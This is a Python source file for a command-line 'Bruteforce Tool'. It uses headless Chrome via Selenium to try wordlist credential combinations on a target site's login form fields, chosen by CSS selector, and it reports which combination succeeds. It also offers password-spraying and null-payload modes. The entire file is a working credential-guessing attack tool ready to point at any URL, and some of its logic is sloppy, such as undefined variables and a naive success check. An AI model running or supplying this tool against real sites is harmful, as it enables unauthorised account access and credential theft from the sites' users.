from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC, select
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
import requests, selenium, sys, argparse

# Logging configurations
import logging
class CustomFormatter(logging.Formatter):
    grey = "\x1b[38;20m"
    green = "\x1b[32;20m"
    yellow = "\x1b[33;20m"
    red = "\x1b[31;20m"
    bold_red = "\x1b[31;1m"
    reset = "\x1b[0m"
    # Define formatting for different levels
    FORMATS = {
        logging.DEBUG: grey+"[*%(levelname)s] %(message)s"+reset,
        logging.INFO: green+"[+%(levelname)s] %(message)s"+reset,
        logging.WARNING: yellow+"[%(levelname)s!] %(message)s"+reset,
        logging.ERROR: red+"[%(levelname)s] %(message)s"+reset,
        logging.CRITICAL: bold_red+"[!!!%(levelname)s] %(message)s"+reset
    }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)


def create_wordlist(var=None,constant=None):
    temp_wordlist = []
    wordlist = []
    if var:
      try:
        for filename in var.values():
            with open(filename, 'r') as f:
                lines = [i.rstrip('\n') for i in f.readlines()]
                temp_wordlist.append(lines)
        wordlist = list(map(list,zip(*temp_wordlist)))
      except FileNotFoundError:
        logger.error(str(filename)+" not found. Provide a valid dictionary file")
        sys.exit(0)

    if constant:
      if not var:
        wordlist = [[i for i in constant.values()]]*args.count

      else:
        for i in wordlist:
          for j in constant.values():
            i.append(j)

    return(wordlist)



def brute(param_list):
    options = webdriver.ChromeOptions()

    # Customise chromedriver flags as required
    options.add_argument("--headless=old")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")

    #To check chrome driver configurations
    try:
      driver = webdriver.Chrome(options=options)
    except Exception as e:
      logger.debug(e)
      logger.error("Some Error occured")
      sys.exit(0)

    #Check website accessiibility
    try:
      driver.get(args.url)
      logger.debug("Website accessible. Title: "+str(driver.title)+"\n")
    except:
      logger.error("Website not accessible")
      sys.exit(0)

    # Check if parameters avaialble the webpage
    try:
      for i in params_dict.keys():
        driver.find_element(By.CSS_SELECTOR, value=i)
        logger.debug(str(i)+" Parameter found in the webpage")
      
      if args.submit:
        driver.find_element(By.CSS_SELECTOR, value=args.submit)

    except selenium.common.exceptions.NoSuchElementException:
      logger.error("Provided parameter "+str(i)+" not in webpage")
      sys.exit(0)

    logger.debug("Paramater available on the webpage\n")

    #Initialize webdriver for bruteforce attack
    webpage = webdriver.Chrome(options=options)

    try:
      webpage.get(args.url)

      found = 0

      print("\x1b[36;20m"+"Initiating bruteforce attack"+"\x1b[0m")
      for values in param_list:
        try:
          for index,value in zip(selector,values):
            webpage.find_element(By.CSS_SELECTOR, value=index).send_keys(value)
            logger.debug(str(i)+" Parameter found in the webpage")

          # Press enter to put in the provided credentials
          webpage.find_element(By.CSS_SELECTOR, value=args.submit).click() if args.submit else webpage.find_element(By.CSS_SELECTOR, value=index).send_keys(Keys.ENTER)
          
          logger.debug("Tried: "+str(values))
          print("Tried: "+str(values),end="\r")
          tried = values

          # Just to check if the element is accessible or not
          webpage.find_element(By.CSS_SELECTOR, value=index)

        except selenium.common.exceptions.NoSuchElementException:
          print("\033[101m"+"Bruteforce successful. Credential combination: "+str(tried)+"\x1b[0m")

          # Check if resume flag is set
          if args.resume:
            webpage.delete_all_cookies();
            webpage.get(args.url)
            found = 1

          else:
            print("\x1b[36;20m"+"Attack completed!!")
            sys.exit(0)


      print("\x1b[36;20m"+"Attack completed!!") if found == 1 else logger.warning("Total "+str(len(param_list))+" attempts. Password not found!")

    # If user presses Ctrl+C to interrupt the program
    except KeyboardInterrupt:
      logger.warning("Bruteforce interrupted by user")
      webpage.delete_all_cookies();
      sys.exit(0)

    # For any other exceptions faced
    except Exception as e:
      logger.debug(e)
      logger.warning("Exception occured. Possibly credential combination: "+str(tried)+ " worked!!")
      sys.exit(0)


if __name__ == '__main__':

  print("\x1b[36;20m"+"*********************************")
  print("*****    Bruteforce Tool    *****")
  print("*********************************\n\n"+"\x1b[0m")

  parser = argparse.ArgumentParser(description="Bruteforce web form fields.")

  parser.add_argument('--resume',action='store_true', help="Continue even after getting valid credentials")
  parser.add_argument("-p", "--params", nargs="+", help="HTTP parameters -p #username=username.txt #password=password.txt")
  parser.add_argument("-c", "--const", nargs="+", help="Constant parameters. Syntax same as for --params. Use full for Null payload bruteforce/Password spraying etc.")
  parser.add_argument("--count", type=int, help="Count of null payloads")
  parser.add_argument('--submit',type=str, help="Optional argument to pass selector of submit button")
  parser.add_argument("-u","--url", type=str, help="Target URL")
  parser.add_argument("-d", '--debug', help="Print verbose information", action="store_const", dest="loglevel", const=logging.DEBUG, default=logging.INFO)

  if len(sys.argv) == 1:  # Check if no arguments were passed
      parser.print_help(sys.stderr)
      sys.exit(1)

  args = parser.parse_args()

  # Create a logger
  logger = logging.getLogger(__name__)
  logger.setLevel(args.loglevel)  # Set overall logging level

  ch_debug = logging.StreamHandler()
  ch_debug.setLevel(args.loglevel)
  ch_debug.setFormatter(CustomFormatter())

  logger.addHandler(ch_debug)


  if (args.url != None and args.params == None):
    logger.error("HTTP parameters for testing not provided")

  params_dict = None
  const_dict = None
  selector = []

  if args.params:
    # Check the format of the passed data
    for i in (args.params):
      if ('::' not in i):
        logger.error("Invalid parameter format.")
        invalid=1
        sys.exit(0)
    params_dict = {}

    for param in args.params:
        key, value = param.split('::')
        params_dict[key] = value

    selector = [i for i in params_dict.keys()]

  if args.const:
    # Check if count is not specified when only constant parameters are passed
    if not args.params and not args.count:
      logger.error("Count has to be specified if only constant params are passed")
      sys.exit(0)

    # Check the format of the passed data
    for i in (args.const):
      if ('::' not in i):
        logger.error("Invalid constant parameter format.")
        sys.exit(0)
    const_dict = {}

    for cons in args.const:
      key, value = cons.split('::')
      const_dict[key] = value

    for i in const_dict.keys():
      selector.append(i)

  logger.debug("Constant parameter passed are: "+str(const_dict))
  logger.debug("Parameter passed are: "+str(params_dict))
  wordlist = create_wordlist(params_dict,const_dict)

  logger.debug("Wordlist generated is: "+str(wordlist)+"\n")

  # Fucuntion call for bruteforcing
  brute(wordlist)